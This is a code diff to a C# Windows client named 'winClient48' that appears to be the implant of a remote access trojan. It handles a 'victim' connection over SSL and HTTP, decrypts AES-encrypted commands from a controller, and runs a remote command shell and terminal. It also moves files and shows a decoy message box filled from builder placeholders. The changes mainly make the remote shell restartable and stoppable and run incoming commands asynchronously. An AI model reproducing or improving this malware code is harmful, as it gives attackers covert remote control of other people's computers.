@@ -24,9 +24,6 @@
  * 
  * .o0o.--------------[ README ]--------------.o0o. */
 
-using AForge.Video;
-using AForge.Video.DirectShow;
-
 using Microsoft.Win32;
 using Plugin.Abstractions48;
 using System;
@@ -43,14 +40,12 @@ using System.Net.Security;
 using System.Net.Sockets;
 using System.Reflection;
 using System.Runtime.InteropServices;
-using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Security.Principal;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using System.Xml.Linq;
 
 namespace winClient48
 {
@@ -205,8 +200,8 @@ namespace winClient48
         private bool m_bMsgbox = bool.Parse("[MB_ENABLE]");
         private string m_szMbCaption = "[MB_CAPTION]";
         private string m_szMbText = "[MB_TEXT]";
-        private MessageBoxButtons m_mbButton = MessageBoxButtons.OK; //(MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), "[MB_BTN]");
-        private MessageBoxIcon m_mbIcon = MessageBoxIcon.Error; //(MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), "[MB_ICON]");
+        private MessageBoxButtons m_mbButton = (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), "[MB_BTN]");
+        private MessageBoxIcon m_mbIcon = (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), "[MB_ICON]");
 
         #endregion
 
@@ -402,7 +397,11 @@ namespace winClient48
                                     {
                                         string payload = Encoding.UTF8.GetString(dsp.GetMsg().msg);
                                         payload = clsCrypto.AESDecrypt(Convert.FromBase64String(payload), v._AES.key, v._AES.iv);
-                                        _Received(v, payload);
+
+                                        Task.Run(() =>
+                                        {
+                                            _Received(v, payload);
+                                        });
                                     }
                                     catch
                                     {
@@ -421,8 +420,11 @@ namespace winClient48
             }
             catch (Exception ex)
             {
+                
+            }
+            finally
+            {
                 is_connected = false;
-                return;
             }
         }
 
@@ -441,7 +443,7 @@ namespace winClient48
                 byte[] abStaticRecvBuffer = new byte[clsVictim.MAX_BUFFER_LENGTH];
                 byte[] abDynamicRecvBuffer = { };
 
-                victim.fnSendCmdParam(0, 0);
+                victim.fnSslSendRAW(1, 0, clsEZData.fnGenerateRandomStr());
 
                 new Thread(() => SendInfo(victim)).Start();
 
@@ -476,14 +478,32 @@ namespace winClient48
                                     string szPlain = Encoding.UTF8.GetString(abBuffer);
                                     List<string> lsMsg = szPlain.Split('|').ToList();
 
-                                    try
+                                    Task.Run(() =>
                                     {
-                                        _Received(victim, szPlain);
-                                    }
-                                    catch (InvalidOperationException)
-                                    {
+                                        try
+                                        {
+                                            _Received(victim, szPlain);
+                                        }
+                                        catch
+                                        {
 
-                                    }
+                                        }
+                                    });
+                                }
+                            }
+                            else if (nCmd == 1)
+                            {
+                                
+                            }
+                            else if (nCmd == 2)
+                            {
+                                if (nParam == 0)
+                                {
+                                    
+                                }
+                                else if (nParam == 1)
+                                {
+                                    //victim.fnSslSendRAW(2, 1, clsEZData.fnGenerateRandomStr());
                                 }
                             }
                         }
@@ -494,8 +514,10 @@ namespace winClient48
             catch (Exception ex)
             {
                 //MessageBox.Show(ex.Message);
+            }
+            finally
+            {
                 is_connected = false;
-                return;
             }
         }
 
@@ -594,6 +616,10 @@ namespace winClient48
 
                                 }
                             }
+                            else if (dsp.Param == 1)
+                            {
+                                victim.fnHttpSend(2, 1, clsEZData.fnGenerateRandomStr());
+                            }
                         }
                     }
                 }
@@ -602,6 +628,9 @@ namespace winClient48
             catch (Exception ex)
             {
                 //MessageBox.Show(ex.Message);
+            }
+            finally
+            {
                 is_connected = false;
             }
         }
@@ -934,8 +963,8 @@ namespace winClient48
                                 if (!g_packetwriter.ContainsKey(filename))
                                     g_packetwriter.Add(filename, new PacketWriter(filename, file_len, v));
 
-                                PacketWriter writer = g_packetwriter[filename];
-                                writer.EnqueuePacket(idx, data);
+                                g_packetwriter[filename].EnqueuePacket(idx, data);
+                                //writer.EnqueuePacket(idx, data);
                             }
                             else if (cmd[3] == "stop")
                             {
@@ -1517,13 +1546,30 @@ namespace winClient48
                 {
                     if (cmd[1] == "start")
                     {
-                        string exePath = clsCrypto.b64D2Str(cmd[2]);
-                        string init_path = clsCrypto.b64D2Str(cmd[3]);
-                        funcShell = new clsfnRemoteShell(v, exePath, init_path);
+                        if (funcShell != null)
+                        {
+                            funcShell.StopCmd();
+                            funcShell = null;
+                        }
+
+                        if (funcShell == null)
+                        {
+                            string exePath = clsCrypto.b64D2Str(cmd[2]);
+                            string init_path = clsCrypto.b64D2Str(cmd[3]);
+                            funcShell = new clsfnRemoteShell(v, exePath, init_path);
+                        }
                     }
                     else if (cmd[1] == "cmd")
                     {
                         funcShell.SendCmd(clsCrypto.b64D2Str(cmd[2]));
+                    }
+                    else if (cmd[1] == "stop")
+                    {
+                        if (funcShell != null)
+                        {
+                            funcShell.StopCmd();
+                            funcShell = null;
+                        }
                     }
                     else if (cmd[1] == "tab")
                     {
@@ -2542,6 +2588,13 @@ namespace winClient48
                 {
                     if (cmd[1] == "start")
                     {
+                        if (m_fnXterm != null)
+                        {
+                            m_fnXterm.fnStop();
+                            m_fnXterm.Dispose();
+                            m_fnXterm = null;
+                        }
+
                         if (m_fnXterm == null)
                         {
                             m_fnXterm = new clsfnXterm(v);
@@ -2790,7 +2843,7 @@ namespace winClient48
                     };
 
                     string info = string.Join("|", info_array);
-                    v.SendCommand(info);
+                    v.fnSendCommand(info);
                 }
                 catch (Exception ex)
                 {
